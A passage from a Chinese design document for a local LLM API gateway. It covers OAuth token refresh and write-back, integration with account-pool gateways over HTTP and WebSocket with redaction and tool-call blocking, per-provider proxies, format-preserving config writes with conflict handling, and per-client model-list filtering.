**没有「跑一条命令拿密钥」那一类**，理由见 §3.2：配置文件不该能执行程序。

#### 改造成本（已核查企业版实现）

企业版目前**只支持静态请求头**：所有凭据最终都落到 `ProviderBase::custom_headers` 这一个 `Vec<(String, String)>` 上，`Authorization: Bearer` 和 `x-api-key` 的区别纯粹是管理员存了什么，provider 自己不知道。唯一的例外是 Bedrock，它做真正的 SigV4 签名，凭据为空时还会走 IMDSv2 去拿临时凭证——**这是现成的「动态凭据」先例**，虽然它每个请求都重新取，没有缓存。

这个 `custom_headers` 间接层其实是好消息：**没有任何 provider 需要知道凭据是什么种类的。** 加 OAuth 的工作集中在一处：

1. 给 `ProviderBase` 加一个 `CredentialSource` 枚举，`Static` 和 `OAuth` 两支，后者持有带过期时间的读写锁。
2. 把 `resolve_headers` 改成 async。**这是唯一有侵入性的一步**，但七个 provider 的流式方法本来就在进入流之前解析请求头，改成 `.await` 每个文件约三行。
3. 刷新退避直接用 `retry.rs`，刷新令牌落盘用 `crypto.rs` 加 `json_secret.rs`。
4. token 交换的 HTTP 调用，企业版 MCP 那边已经实现过刷新授权流程，把逻辑摘出来约 150 行，别搬那个文件（它有 1500 多行且绑死 Postgres）。

**估算：新增 250 到 350 行，另外七个 provider 各改三行左右。** 不算小，但边界很清楚，不会渗进业务逻辑。

#### 接入 sub2api 这类账号池网关

对我们来说它**就是一个普通的上游 provider**，协议是 Anthropic 或 OpenAI Chat，不需要任何特殊代码路径。但有三个集成细节必须处理，否则接上了也用不好：

**一、Session 亲和必须透传。** sub2api 用 `session_id` 请求头做账号粘滞，让同一会话固定落在同一个上游账号上，这样 prompt cache 才不会失效。如果我们转发时不带这个头，每个请求可能落到不同账号，缓存全废，成本反而比不用网关还高。

好在这和我们 §3.5 `load-balance` 的会话粘滞是同一个问题：用同一个会话指纹，既做本地的 provider 粘滞，又填这个头。一套机制两处用。

**二、Header 白名单。** 默认我们应该剥掉不认识的请求头，这是对的。但这类网关依赖特定头工作，所以 provider 配置里要有 `forward_headers` 白名单。别做成「全部透传」——那会把客户端的认证头原样送给中转站。

**三、WebSocket 升级。** sub2api 为 Codex CLI 提供了 `/backend-api/codex/responses` 的 WS 桥接（客户端 WS ↔ 上游 HTTP/SSE）。如果要覆盖这条链路，我们的数据面需要支持 WS 升级代理，而不只是 HTTP + SSE。这是一块独立工作量，排在 M6+（企业版整个工作区没有任何上游 WS 客户端，无代码可搬）。

> **做了**（2026-09-10）。这一层最容易犯的错是**把它做成一根管子**：
> 把两边的帧对着倒是最省事的写法，也是一条绕过出站脱敏（§5.1）和工具墙
> （§5.2）的合法后门 —— 而用户完全看不出这条路和别的路有什么不同。
> 重放那次踩过一模一样的坑（§11 M6+），结论是同一句：**任何绕过主管线
> 的路径都要把管线上的保护重新点一遍。**
>
> 所以每一帧文本都过同一套：出去的走 `redact_into`，回来的先还原占位符
> 再喂工具墙，命中高危且这家不受信任时**那一帧不发**、整条连接切断 ——
> 和 SSE 那条路同一条纪律。
>
> 四件写的时候才知道的：
>
> 1. **整条连接一本账。**每帧各起一本的话，第二帧的 `<<TW_SECRET_1>>`
>    会和第一帧的撞车 —— 两个不同的密钥映射到同一个占位符，还原时必然
>    给错一个。**那不是会不会发生的问题，是第二帧只要命中一次就一定
>    发生。**为此给脱敏加了个「接着已有账本编号」的入口。
> 2. **工具墙原来只认流式形状。**它按 `content_block_start` 记名字、
>    按 `partial_json` 攒参数，而 WS 上一帧就是一个完整对象，没有分片
>    可攒 —— 只认流式的话，这一层对 WS 完全失明。补了「完整工具调用」
>    这一支（顺带也认了包在 `content` 数组里的那种）。
> 3. **不用 tokio-tungstenite 自带的 `connect_async`。**那会带进另一套
>    TLS 信任根，于是「数据面信任的证书」和「WS 信任的」变成两回事，
>    而那种不一致的表现是「HTTP 通、WS 报证书错误」。复用 L1 那份
>    rustls 配置。
> 4. **走代理的上游明确拒绝，不悄悄绕过。**§3.7 的代理是给 reqwest 配
>    的，这里是自己建连。悄悄绕过用户配的代理，等于把他以为在代理后面
>    的流量直接发出去 —— 比不支持严重得多。
>
> **一条没实测的**：手上没有跑着的 sub2api WS 桥，所以帧的真实形状没有
> 验证过。工具墙那一层两种形状都喂（已经是 `data:` 行的原样过，裸 JSON
> 包一层）—— 猜错一种的代价是漏检，而漏检正是这一层要防的。

#### 一条边界

sub2api 的定位是把消费级订阅（Claude Pro/Max、ChatGPT Plus）通过 OAuth 转成 API 端点，它自己的 README 明确警告这**可能违反上游服务条款**，风险由使用者承担。

我们的处理是职责分离：**Lite 把它当普通上游转发，但不在 Lite 内部重新实现「订阅账号池 + 客户端指纹伪造」那一层。** 两个理由，一个是工程的一个是风险的——你已经有 sub2api 在跑那层了，重复实现零技术收益；而把指纹伪造逻辑搬进我们的代码库，等于把它的 ToS 风险也搬了进来，而 Lite 本身是个中立的本地网关。

架构上这个切分也更干净：Lite 管路由、观测、成本；账号池管上游身份。两边通过一个普通的 HTTP 端点解耦。

#### OAuth 那一类做完之后（2026-09-10，1026 个测试）

> **先记一次自己算反了的账。**这一节最初写的是「会轮换 refresh token 的
> 服务器有意不支持」，理由是「一个会自己改你配置文件的网关很可怕」。
> 那个判断错在漏掉了一个事实：
>
> **服务器换发新 refresh token 的那一刻，旧的已经在服务端作废了。**
>
> 于是「不写回」根本不是保守选项 —— 它保证了用户的 config.yaml 从那一秒
> 起就是坏的，只是症状延迟到下一次重启（那家上游突然全是 401，而那时
> 没人会想到是几天前的一次轮换）。写回才是安全的那一边，剩下的风险只是
> 「写失败」，而那是可检测、可重试、可以说出来的。
>
> 所以现在**默认写回**，而且是这个程序里唯一一次不是人发起的配置写入。
> 围绕这一条的五个决定：
>
> 1. **只动那一个标量，走 span 补丁。**用户的注释、空行、字段顺序一个字
>    都不能变 —— 这是一次他没要求的写入。有一条测试逐行比对，断言
>    「只有一行不同、行数不变」。找不到那个字段就报错，**不追加**：
>    追加意味着我们猜错了结构，而在一个装着明文密钥的文件里猜结构是
>    不能接受的。
> 2. **写文件的是控制面，不是数据面。**数据面只把新值往通道里一放就继续
>    转发（和 §4.7 的 body 同一条纪律）。控制面那边才有 `ConfigManager`：
>    写之前存历史、乐观并发对版本、原子写加 0600、记指纹防回环 ——
>    这一整套本来就为「界面改配置」建好了，轮换只是又一个调用方。
> 3. **轮换不进配置历史。**第一条理由就够：**回滚到一次轮换之前，拿到的
>    是一个已经作废的 token** —— 那一版不是可以退回去的状态，是个陷阱。
>    另外两条：一小时一次的轮换两天就能把 50 版历史占满，把用户自己改过
>    的那些全挤出去；而每一版都是一份明文凭据的副本，那几份副本永远派
>    不上用场。
> 4. **缓存要认「配置追上来了」，否则会转成一个停不下来的循环。**写回
>    文件 → 监听响 → 重载 → 新配置里的 refresh 和缓存里那份配置的指纹
>    对不上 → 重新换一次 token → 又换回一个新的 → 又写一次文件……
>    出口是：指纹不同但**配置里的值就是我们手里这个**时，照样算数。
>    真机上验过：5 个请求 5 次交换，静置 6 秒 0 次。
> 5. **写不进去时不把新 token 印在界面上让人手抄。**那等于把一份凭据放进
>    截图和 issue 里。真的写不进去时，出路是修好文件权限，或者重新走一次
>    授权 —— 而这一条要一直挂着说，因为重启之前不处理，这家上游就废了。
>
> 报的时候**成功只说一次，失败每次都说**：会轮换的服务器一小时换一次，
> 「已经帮你写回去了」这句话说一次就够（通知的代价是用户学会忽略通知，
> §2.4）；而失败是个没解决的问题，何况从成功变成失败是状态变了。
>
> 四件写的时候才知道的：
>
> 1. **换 token 必须走这家 provider 自己的 HTTP client。**它带着该走的
>    代理（§3.7）。用一个干净的 client 去换的话，代理后面的用户会得到
>    一个「数据面通、刷新不通」的组合 —— 而那个症状看起来完全不像凭据
>    问题。代价是密钥解析要提到取 client 之后，数据面和控制面各挪一处。
> 2. **配置指纹要进缓存的键。**没有它，用户在 config.yaml 里换了个新
>    的 refresh token、重载配置，然后发现还在用旧的报 401 —— 而配置
>    文件里明明是对的。**缓存盖住用户的修改是最难查的一类。**
> 3. **提前量比有效期长时不能变成「每个请求刷一次」。**`expires_in: 60`
>    配 `refresh_before: 5m` 减出来是负的，当成「现在就该刷」的话，每个
>    请求前面挂一次往返 —— 比不刷更糟。下限 1 秒，宁可让 token 短命。
> 4. **token 端点的错误正文会回显你发过去的东西。**`mask_body` 挡不住
>    它 —— 见 §9.7 那条，那是这一轮最值钱的发现。
>
> 换 token 失败**只失败这一家**，然后照常故障转移（和密钥取不到同一条
> 纪律），并且退避 30 秒：不退避的话，一个坏掉的 token 端点会被
> 每个请求敲一次，既解决不了问题又可能让对方限流。
>
> access token **只在内存里，不落盘**。它是派生状态 —— 不是用户输入
> 的、会过期、丢了重换一个就行（§3.1）。跨配置重载存活，因为改一条限流
> 规则不该让所有 OAuth 上游各自多打一次往返。
>
> **`twcore check` 不联网换 token**（那是用户期望立刻返回的命令），但
> 能离线查的都查了：refresh 为空、token 端点不是 https（回环除外 ——
> 本机的 http 不算明文过网，报它是个假警报）、`refresh_before` 写得
> 看不懂。这三样写错的症状全都是「网关起来之后一片 401」。

---

### 3.7 出站代理

有些上游要走代理才连得上，而**不同上游需要的代理往往不一样**：有的要走，有的必须直连，本地 Ollama 绝对不能走（走了必然连不上）。**哪个上游走哪个代理是用户的选择** —— 我们要做的只是让这件事配得出来。所以代理不能是一个全局开关。

#### 代理是命名实体，不是内联字段

和 provider、group 一样，代理声明一次、到处引用：

```yaml
proxies:
  - name: airport
    type: socks5h                 # socks5 | socks5h | http | https
    addr: 127.0.0.1:7890

  - name: us-node
    type: http
    addr: proxy.example.com:8080
    auth: { user: alice, pass: ${PROXY_PASS} }

providers:
  - name: anthropic-official
    proxy: airport
  - name: relay-cn
    proxy: direct                 # 内置，强制直连
  - name: ollama
    proxy: direct                 # 本地服务，走代理必挂
```

两个**内置**代理名，不用声明也不能覆盖：

| 名字 | 含义 |
|---|---|
| `direct` | 强制直连，忽略一切系统设置 |
| `system` | 跟随操作系统的代理设置 |

**默认值是 `direct`，不是 `system`。** 显式优于隐式：如果默认跟随系统，用户在系统里开了个全局代理，本地 Ollama 就会莫名其妙连不上，而配置文件里看不出任何线索。想省事的人写一次 `proxy: system` 就行。

#### `socks5h` 值得单独说

`socks5` 和 `socks5h` 的区别是**域名在哪一端解析**：

- `socks5` — 本地解析 DNS，然后把 IP 发给代理
- `socks5h` — 把域名原样发给代理，**由代理端解析**

这个差别在本地 DNS 不可信时是决定性的：解析出来的 IP 根本连不通，即使代理本身是好的。**默认推荐 `socks5h`**，UI 上的下拉框把它排在 `socks5` 前面并加一句说明。

这类细节不写进设计，实现时十有八九会默认选 `socks5`，然后花半天排查「代理明明是通的为什么还是连不上」。

#### 实现约束：代理是 Client 级别的

reqwest 的代理配置绑在 `Client` 上，**不能按请求切换**。这有三个连带后果：

1. **每个 provider 一个独立的 `reqwest::Client`。**这本来也是对的——连接池按上游隔离，一个慢上游不会占着另一个的连接。
2. **改代理配置要重建 Client。**热重载时属于 §3.8 的「温」级：新 Client 建好后原子换入，正在跑的请求持有旧 Client 的 `Arc` 跑完。
3. **`reqwest` 要开 `socks` feature。**默认不带，忘了开的话 `socks5://` 的 URL 会直接报不支持。

#### 代理挂了怎么办：默认失败，不静默降级

代理不可用时有两种选择，我们**默认让请求失败**，而不是悄悄改走直连。

理由：静默降级会让请求以你意想不到的路径出去。配了代理的上游，直连大概率也是失败的，只是错误信息变得更难懂；更糟的情况是它真的连上了，而你以为自己在走代理。

想要降级的人显式声明：

```yaml
providers:
  - name: anthropic-official
    proxy: airport
    on_proxy_fail: direct         # 默认是 fail
```

#### 不做代理链

「通过 A 连 B 再连上游」这种多级串联不做。真需要的话，本地的 clash 或 mihomo 本来就能把链路编排好，我们只要连它那一个入口即可——把这件事交给专门做这个的工具，比在自己的配置里长出一套链路语法要好。

### 3.8 配置的读写模型：双向，而不是单向

这一节解决 Clash 最恶心的那个点：**只能改文件再热重载**。

我们要的是两条路都通——API 改配置由 core 负责同步回**那一份** `config.yaml`；你手改文件 core 也要认。两个写入方，一份文件，两个方向。这是个真难题，下面逐个拆。

#### 两个写入方，四个问题

| 写入方 | 怎么写 |
|---|---|
| **A · UI / CLI** | 经 control API，结构化，明确知道改了哪个字段 |
| **B · 你自己 / 编辑器 / 脚本** | 直接改文件，core 只能看到 diff |

由此产生四个必须解决的问题：**写回时怎么不毁掉格式和注释、怎么不触发无限回环、两边同时写怎么办、非法配置进来怎么办。**

#### 一 · 写回文件：最小文本替换，不是重新序列化

**绝对不能「反序列化 → 改结构体 → 重新序列化」。** 那会丢注释、重排键序、统一引号风格，等于每次改一个字段就把你的文件重写一遍。这正是 cc-switch 那批覆写 issue 的同一类错误（§1），只不过它是在别人的配置文件上犯的。

做法是**带位置信息的解析 + 原文本上的最小替换**：

```
解析 YAML，保留每个节点的字节区间（span）
        ↓
定位到要改的那个节点，比如 providers[1].base_url 的值
        ↓
只替换那一段字节，其余原文一个字节都不动
        ↓
新增字段时，按同级节点的缩进和风格插入
```

注释、空行、缩进风格、引号偏好全都保住了，因为我们根本没碰它们。

> **表单模式做到哪儿了**（2026-09-11）。按这一节的退路走：**只改标量，
> 结构性的增删引导到文本模式**。现在能在界面上改的：
>
> | | |
> |---|---|
> | provider | `base_url`、`protocol`、`proxy`、`billing`、`trust` |
> | 策略组 | `type`、`session_affinity`、`select` 的选中项 |
>
> 新增/删除 provider、改路由规则，仍然走文本模式（它是全的：校验、
> 历史、回滚、乐观并发都在）。
>
> **写的时候撞上一件事：span 补丁原来只能改「已经写在文件里」的键。**
> 而配置里绝大多数字段是可选的、默认不写的 —— `protocol`、`billing`、
> `trust`、`session_affinity` 全都是。也就是说表单模式只能改用户碰巧
> 写过的字段，**而他最需要界面的时刻，恰恰是想设一个自己从来没设过的
> 值的时候**。补了一个 `insert`：父映射必须已经存在，插在最后一个子键
> 的下一行，**缩进抄那一行的而不是按层数算**（用户可能用 4 空格，也
> 可能是列表项里那种对齐）。三道护栏和 `set` 一样，外加一条「节点数
> 只能多 1」。
>
> **行内写法也要支持。**`- { name: 甲, key: sk-a }` 是完全合法的写法，
> 而按块式的做法在下一行插会产出一份解析不了的 YAML —— 护栏拦得住，
> 但那时用户看到的是「这是个 bug，请贴到 issue 里」，而他只是用了一种
> 正常写法。行内的插在花括号里面，**逗号风格抄已有的**（`{a: 1, b: 2}`
> 和 `{a: 1,b: 2}` 都有人写，跟着来比统一成我们的偏好更不打扰）。
>
> 实测：块式配置连改七个字段、行内配置连改五个（全都是原来不存在的），
> 注释和排版一字未动，网关全部认到。

**技术选型要在 M1 落实**：Rust 的 YAML 生态里，`serde_yaml` 已经归档不再维护，且本来就不保留格式。需要的是一个能给出节点 span 的解析器（`yaml-rust2` / `saphyr` 这一系提供 marker 信息），在它之上自己写一层薄薄的 span-to-patch。**这一层的具体实现要在 M1 第一周就验证**，因为如果 span 精度不够，整个「表单模式」的体验都要重新设计。退路是把表单模式限制为「只改标量值」，新增和删除结构一律引导到文本模式。

#### 这是全项目最危险的代码，必须有测试护栏

**它写用户唯一的配置文件。** 而本方案最重的教训（§1 那六个 cc-switch issue）恰恰是「程序写坏了用户的配置」。没有护栏，我们就是在换个文件重复同一个错误。

三层防护，全部列进 M1 验收：

**一、round-trip property test。** 随机生成配置 × 随机 patch，断言三件事：只有目标 span 的字节变了、其余字节**逐字节相同**、重新解析后语义等价。必须是 property test 而不是几个手写例子——手写用例永远覆盖不到真实配置的形状。

**二、语料要包含**：行内与行尾注释、锚点与别名、多行标量（`|` 和 `>`）、流式与块式混排、中文、CRLF、tab 缩进、极长的行。每一项都是格式保留的经典翻车点。

**三、运行时护栏，不只是测试时。** 每次写入之前，在内存里执行一遍 patch → 重新解析 → 与预期结构比对，不一致就**拒绝写入**并报错。开销几百微秒，换来「永远不会写出一个自己都解析不了的文件」。

另外两项测试补在别处：`tw-api` 的契约 snapshot 测试（防 §9.5 说的 DTO 漂移），以及 Tauri 侧的 e2e 冒烟，至少覆盖 §7.6 首次运行那五步。

#### 二 · 避免回环：写入指纹

core 写完文件，文件监听会立刻触发，如果不加区分就会把自己刚写的又重载一遍，严重时形成循环。

判据不能只用 mtime——精度不够，同一秒内的多次写会漏判。**记录三元组**：

```
core 写文件后记下 (mtime, size, blake3(content))
文件事件到达 → 读当前文件，比对三元组
        ├─ 完全一致 → 是我自己写的，忽略
        └─ 任一不符 → 外部改动，走热重载
```

顺带一提，文件监听要带**去抖动**：编辑器保存常常触发多次事件（写临时文件、rename、改属性），聚合成 200ms 窗口内的一次处理。

#### 三 · 冲突：乐观并发，绝不静默覆盖

**API 侧**用版本号做乐观并发，和 HTTP 的 `If-Match` 是同一套：

```
PATCH /config
{
  "base_version": "blake3:a1b2c3…",
  "ops": [ { "op": "replace", "path": "/providers/relay-cn/base_url", "value": "…" } ]
}
```

core 当前配置的 hash 不等于 `base_version` → 返回 `409` 和当前配置，UI 重新合并再试。

**文件侧**更要小心。core 准备写文件时，要再确认一次磁盘上的文件还是它上次读到的那份：

```
写入前重新计算文件 hash
        ├─ 和缓存一致 → 正常写
        └─ 不一致 → 你在这期间手改过 → 拒绝写入
                    通知 UI，展示三方 diff，让你决定
```

**绝不静默覆盖手改。** 这条是从 cc-switch 那批 issue 直接学来的教训，只不过这次保护的是我们自己的配置文件。

#### 四 · 非法配置：保持旧的继续服务

桌面工具和服务器在这里有个重要差异：**服务器可以拒绝启动，桌面工具不行。** 你手抖打错一个字母，不能让所有 AI 客户端瞬间断线。

```
文件变更
   ↓
① 语法解析      失败 → 保持当前配置，UI 报错并定位到行，托盘变黄
   ↓
② Schema 校验   失败 → 同上
   ↓
③ 语义校验      route 引用的 group 不存在？兜底 route 缺失或有多条？
   ↓            provider 重名？失败 → 同上
④ 构建运行时对象（provider 池、规则树、group 状态）
   ↓
⑤ ArcSwap 原子换入
   ↓
新请求用新配置；正在跑的流持有旧配置的 Arc，跑完自然释放
```

第 ③ 步的语义校验值得单独强调：语法正确但语义错误的配置最危险，比如某条规则指向一个已经删掉的 group——YAML 完全合法，但运行时会把请求路由到空处。这类检查必须在换入之前做完。

#### 热重载分三个等级

不是所有配置都能热换。要在 schema 里给每个字段标好等级，UI 上直接显示改这个字段的代价：

| 等级 | 字段 | 行为 |
|---|---|---|
| **热** | providers、routes、groups、proxies、budgets、脱敏规则、日志级别 | 立即生效，正在跑的流不受影响 |
| **温** | 监听地址与端口 | 重建监听器：新的先起来，老的停止接受新连接并等现有请求自然结束 |
| **冷** | 存储路径、数据库位置 | 需要重启 core。UI 上明确提示，并提供一键重启 |

#### 配置 API

原方案只有一个整体替换的 `PUT /config`，太粗，UI 改一个字段要把整份配置发回来。补上细粒度的：

```
GET    /config                    结构化配置 + version
GET    /config/raw                原始 YAML 文本（给编辑器）
PUT    /config/raw                整体替换文本（编辑器保存，带 base_version）
POST   /config/validate           只校验不应用，返回带行号的结构化错误

PATCH  /config                    结构化 patch（带 base_version，见上）
POST   /config/providers          新增 provider
PUT    /config/providers/:name    修改
DELETE /config/providers/:name    删除
                                  routes / groups / budgets 同构

POST   /config/reload             强制从磁盘重载
GET    /config/history            变更历史：时间、来源、diff
POST   /config/rollback/:version  回滚到某个版本
```

**变更历史和回滚是这套设计的关键一环**，不是可有可无的附加功能——它替代了「临时覆盖层」的全部作用（§3.1）。

每次写入前把旧文件完整存一份快照。配置通常几 KB，保留 50 份也就几百 KB。「我刚才改坏了」变成点一下就能退回，而且对任何改动都有效，不限于预先设计好的那几个字段。每条记录标明来源是 UI、CLI 还是外部文件改动，出问题时一眼看出是谁干的。

#### CLI 走同一条路

`twcore` 的 CLI **不直接改文件**，而是走 control API 的 unix socket：

```
twcore config get providers
twcore config set providers.relay-cn.base_url https://…
twcore provider add --name x --protocol anthropic --base-url …
twcore group select sonnet-pool relay-cn      # 和 UI 上点一下完全等价
twcore config edit                            # 拉起 $EDITOR，保存后校验再提交
twcore config history                         # 看变更记录
twcore config rollback 3                      # 退回三个版本前
twcore reload
                                              # 服务端只有一个命令：twcore serve（§9.5）
```

这样冲突检测、校验、历史记录、写回时的格式保留全部复用同一套，CLI 和 UI 行为完全一致，不会出现「命令行改的和界面改的效果不一样」。所有写入都落到同一份 `config.yaml`，没有第二个地方需要你去查。

**core 没在跑的时候**，CLI 降级为直接读写文件，但会打一行提示说明当前是离线模式、没有做语义校验。

#### UI 上的冲突提示

文本模式用 Monaco，就会遇到所有编辑器都要处理的经典问题：**你正编辑着，磁盘上的文件被外部改了。**

照编辑器的成熟做法办：如果你没有未保存的改动，静默重载；如果有，弹提示给三个选项——保留我的、用磁盘的、看 diff 再决定。不要自作主张合并。

### 3.9 模型列表：每个客户端看到什么

#### 三句话版本

1. **模型列表不用你写。** 我们去问每个上游「你有哪些模型」，汇总起来。
2. **每个客户端看到的是这份汇总的一个子集**，默认按它说什么方言过滤。
3. **想再限制，加一行 `allow`。**

模型选了之后**走哪个上游**是另一回事——那是路由规则（§3.4）的职责，和这一节无关。这两件事分开，是整个设计的关键。

#### 跟着一个例子走一遍

假设你配了三个 provider。启动后我们对每个打一次 `/v1/models`（§4.6 的 L2 探测，零成本），拿到：

```
anthropic-official  (protocol: anthropic)
    → claude-opus-4-1, claude-sonnet-4-5, claude-haiku-4-5

relay-cn            (protocol: anthropic)
    → claude-sonnet-4-5, claude-opus-4-1

ollama              (protocol: openai-chat)
    → qwen3-coder, llama-4
```

汇总去重，得到**模型全集**，同时记住每个模型有哪些 provider 能提供：

| 模型 | 谁能提供 |
|---|---|
| `claude-opus-4-1` | anthropic-official, relay-cn |
| `claude-sonnet-4-5` | anthropic-official, relay-cn |
| `claude-haiku-4-5` | anthropic-official |
| `qwen3-coder` | ollama |
| `llama-4` | ollama |

现在三个客户端连上来，各自看到的是：

```
Claude Code            说 Anthropic 方言
  → 只保留 anthropic 协议的 provider 提供的
  → 看到 claude-opus-4-1, claude-sonnet-4-5, claude-haiku-4-5

opencode               说 OpenAI 方言
  → 看到 qwen3-coder, llama-4

某个自动化脚本          配了 allow: [claude-haiku-*]
  → 先按方言得到三个 claude，再过 allow
  → 看到 claude-haiku-4-5
```

**这就是全部。** 没有需要维护的清单，没有需要发明的名字。

#### 配置长什么样

绝大多数人**什么都不用配**：

```yaml
clients:
  - { name: claude-code, key: tw-xxxxxxxxxxxx }
  - { name: opencode,    key: tw-yyyyyyyyyyyy }
```

想限制某个客户端时才加一行：

```yaml
  - name: some-script
    key: tw-zzzzzzzzzzzz
    allow: [claude-haiku-*]      # glob，只给便宜的
```

`allow` 有三种状态，语义必须分明：

| 写法 | 含义 |
|---|---|
| **不写** | 按方言自动过滤。**默认，绝大多数情况** |
| `allow: [claude-haiku-*]` | 在方言过滤的基础上，再只保留匹配的 |
| `allow: []` | **一个都不给。** 这是「临时禁用这个客户端」的正当用法 |

最后一条要特意定死，因为 one-api 和 new-api 在这里的语义**正好相反**（一个里空表示全放行，另一个表示全禁止），分歧本身就说明容易搞错。YAML 里「字段缺失」和「空数组」天然可区分。

#### 想给某个客户端钉死一组模型

`allow` 写 glob 是**模式过滤**，写精确名字就是**固定列表**：

```yaml
clients:
  - name: claude-code
    key: tw-xxxxxxxxxxxx
    allow: [claude-opus-4-1, claude-sonnet-4-5]     # 就这两个，不要 haiku

  - name: codex
    key: tw-yyyyyyyyyyyy
    allow: [gpt-5.2, gpt-5.2-mini]
```

一个前提：**写在 `allow` 里的模型必须在推导出的全集里**，否则它不会凭空出现——那违反「列表即承诺」。如果某个上游确实提供它但没在自己的 `/v1/models` 里列出来，在那个 provider 上补一条 `models:` 即可（见下）。

#### 但有个限制：我们控制不了客户端内置的模型别名

这一条必须说清楚，否则会让人困惑。

Claude Code 的模型选择器里除了从网关发现的模型，**还有它自己内置的别名**（sonnet、opus、haiku 这些）。**那部分不归我们管。** 用户选了内置的 haiku，客户端会发一个具体的模型名过来——而如果 `allow` 里没有它，我们会返回 403。

**效果就成了「能看到但用不了」**，这不是好体验。三条出路，按推荐顺序：

| 做法 | 效果 | 适用 |
|---|---|---|
| **路由，而不是拒绝** | 把 haiku 的请求导向便宜的池子。用户照常能用，只是走了别处 | **推荐。**大多数情况下你想要的是「控制它走哪」，不是「禁止它」 |
| **接管时覆盖内置别名** | 写 `ANTHROPIC_DEFAULT_HAIKU_MODEL` 等环境变量，把三个别名指到你想要的模型上 | 想让 haiku 这个选项本身就指向别的模型时 |
| **就是要拒绝** | `allow` 里不放它，撞上就 403 | 真的要禁止（比如禁止某个脚本用 Opus 省钱） |

第一条是默认建议：**用路由解决，比用拒绝解决体验好得多**。§3.4 那句「客户端的模型选择器该反映我要什么级别的模型，而不是我要走哪条线路」在这里同样成立。

选第三条时，403 的错误信息要说人话——`[ThinkWatch] 这个客户端不允许使用 claude-haiku-4-5`（§4.6.1 的错误契约），而不是一个干巴巴的 permission denied。

#### 三个客户端，三种做法

「让某个客户端看到固定模型」这件事，具体怎么落地取决于它怎么发现模型（§3.9 那张表）：

| 客户端 | 怎么做 |
|---|---|
| **Claude Code** | `allow` 管住发现的那部分 + 环境变量覆盖内置别名。两者都要，缺一个就有漏网的 |
| **Codex** | 只能写它的**本地模型目录文件**——它压根不问我们要列表。改完要重启它 |
| **Zed** 的 anthropic 块 | `allow` 就够，它以 `/v1/models` 为主要来源 |
| **其余** | 写各自的配置文件（§7.11 的接管） |

#### 两个特殊情况

**上游没有 `/v1/models` 端点。** 有些中转站没实现它（§4.6 标为「不支持」而非「失败」）。这时在那个 provider 上手写兜底：

```yaml
providers:
  - name: relay-cn
    models: [claude-sonnet-4-5, claude-opus-4-1]   # 探测不到时用这个
```

注意这是 **provider 级**的「这家有什么」，不是全局的「我们对外暴露什么」。

**探测结果要缓存。** 模型列表变化不频繁，缓存 24 小时，UI 上给个手动刷新。不要每次有人调 `/v1/models` 就去打上游——那会把一个本该零成本的端点变成一次串行网络往返。

---

#### 为什么不让用户手写模型目录

我最初的设计是让用户写一份目录，每条声明「这个模型叫什么、走哪个策略组」。**那是错的，两个理由。**

**一、和路由规则打架。** §3.4 的 routes 已经在决定「这个请求去哪」了。如果目录里也写死 `claude-sonnet-4-5 → sonnet-pool`，那一个 250k token 的 sonnet 请求——目录说走 sonnet-pool，而 routes 里那条「超过 200k 走 long-ctx-pool」说走别处——**听谁的？**

两个地方做同一件事，必然要定优先级，而这种优先级从来没有一个所有人都觉得自然的答案。**取消目录之后这个问题就不存在了：路由只有一个地方。**

**二、那份清单大部分时候是废话。** 用户写的内容就是「上游有什么就暴露什么」，而这个信息我们探测一下就有。让人手抄一遍机器已经知道的事，是设计上的浪费。

#### 为什么不发明新的模型名

「暴露一个叫 `sonnet-cheap` 的模型，让它走便宜的池子」——这个需求听起来合理，但**代价比看起来大**。

一旦我们发明客户端不认识的名字，就会撞上一串坑：

| 坑 | 后果 |
|---|---|
| 输出上限被砍 | Claude Code 对**无法识别的模型 id** 默认把输出上限降到 32000 |
| 命名的两难 | 想让模型出现在 Claude Code 的选择器里，id 必须带 `claude` 或 `anthropic`；但 `CLAUDE_CODE_MAX_CONTEXT_TOKENS` **只对不以 `claude-` 开头的 id 生效**。**这两条直接打架** |

而同样的效果，用一条路由规则就能拿到，且**一个坑都不踩**：

```yaml
routes:
  - name: 这个脚本一律走便宜的
    when: { client: some-script }
    to: cheap-pool
```

那个脚本照常发 `claude-sonnet-4-5`，但实际走便宜池子。

代价是用户在客户端的下拉框里看不到「sonnet-cheap」这个字样。**这个代价值得付**——客户端的模型选择器本来就该反映「我要什么级别的模型」，而不是「我要走哪条线路」。后者是网关的职责，不该泄漏到客户端界面上。

（真要发明名字的话，`anthropic/xxx` 这种形式能同时绕过上面那两条约束：带 `anthropic` 所以能被发现，又不以 `claude-` 打头所以窗口变量有效。但这是逃生舱，不是推荐路径。）

#### 顺带修正一条我之前说错的

我说过「换模型名会作废 prompt cache」。**这说法过头了。**

Anthropic 的缓存文档完全没提 model 维度的作用域，而且更要紧的是：我们改的是**发给上游的名字**。只要上游收到的名字稳定，缓存行为就稳定，客户端看到什么根本不上传。**纯改名不影响缓存。**

真会作废缓存的是 §3.4 那个 `set: { model }`——那是真的换了一个模型，不是换个称呼。两件事要分清。

---

#### 实现：一个函数，两处调用

准入检查和列表生成**必须是同一个函数**：

```
resolve_allowed_models(client) -> Set<ModelName>
        ↑ 唯一的真相来源
        ├─ GET  /v1/models      → 把它列出来
        └─ POST /v1/messages…   → 检查请求的模型在不在里面
```

这样列表和准入不可能不一致，而且只有一处需要维护。位置在 §4 管线的 identify 之后、route 之前，**任何入站端点都要过它，包括 `GET /v1/models/:model` 和将来新加的**。

**这一条是从两个项目的 bug 里学来的**，它们各自在不同地方做检查，而两处都有绕过路径：one-api 在认证中间件里查、依赖请求体里的 `model` 字段，于是不带 model 的端点直接绕过；new-api 在分发器里查，但那段代码在一个 `else` 分支里，走「指定渠道」时完全不执行。两个项目、两种架构，栽在同一类问题上。

顺带一提，`GET /v1/models/:model` 在**两个项目里都没做过滤**——一个被限制成只能用便宜模型的 token，仍然可以直接 GET 一个贵模型拿到 200。单点函数天然覆盖它。

#### 实现：列表必须是能兑现的承诺

one-api 的 `/v1/models` 会返回 token 允许的模型，但它**跳过了「这模型到底有没有渠道能服务」的检查**。结果是列表广告了某个模型，请求过去却 503。**列表撒了谎。**

我们的三个条件必须全部满足：

| 条件 | 检查什么 |
|---|---|
| 至少一个启用的 provider 支持它 | 从探测结果推导 |
| 该客户端允许 | 方言过滤 + `allow` |
| routes 能路由到某处 | 兜底规则永远存在，所以这条实际总成立 |

第三条「总成立」正是取消目录之后白捡的好处。

**但临时不可用不算**：某个组里所有 provider 都熔断了，模型**仍然要出现在列表里**，只是标注状态。熔断是分钟级的，从列表里消失会让客户端以为模型没了，而客户端通常不会重新拉列表。

#### 实现：客户端到底调不调这个端点（查证过）

